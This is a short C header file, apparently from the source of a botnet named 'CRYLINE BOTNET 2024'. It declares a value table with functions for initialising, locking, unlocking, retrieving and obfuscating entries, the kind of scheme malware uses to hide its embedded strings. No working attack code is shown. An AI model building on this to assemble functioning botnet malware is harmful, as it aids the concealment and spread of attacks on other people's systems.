/* 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;; CRYLINE BOTNET 2024  ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;      by @DarxiS      ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
*/

#pragma once

#include <stdint.h>

#include "LIBRARIES.h"

struct __TABLE_VALUES 
{
    char * _GET_VALUE;
    uint16_t _VALUE_LENGHT;
};

void __TABLE_INIT(void);
void __TABLE_UNLOCK_VALUE(uint8_t);
void __TABLE_LOCK_VALUE(uint8_t); 
char *__TABLE_RETRIEVED_VALUE(int, int *);

static void __ADD_ENTRY_POINT(uint8_t, char *, int);
static void __OBFUSCATION(uint8_t);
